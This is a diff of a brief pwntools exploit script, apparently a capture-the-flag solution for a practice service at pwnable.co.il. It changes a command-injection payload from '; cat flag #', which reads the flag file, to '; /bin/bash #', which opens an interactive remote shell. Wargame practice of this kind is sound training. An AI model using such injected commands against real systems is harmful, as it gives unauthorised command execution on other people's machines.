@@ -1,12 +1,14 @@
 from pwn import *
 
-paylod = "; cat flag #"
-conn = remote("pwnable.co.il", "9013")
+def main():
+	paylod = "; /bin/bash #"
+	conn = remote("pwnable.co.il", "9013")
 
-conn.recvline()
-conn.recvline()
-conn.sendline(paylod)
-conn.recvline()
+	conn.recvline()
+	conn.recvline()
+	conn.sendline(paylod)
+	conn.recvline()
+	conn.interactive()
 
-# Profit
-print(conn.recvline().decode())
+if __name__ == "__main__":
+	main()
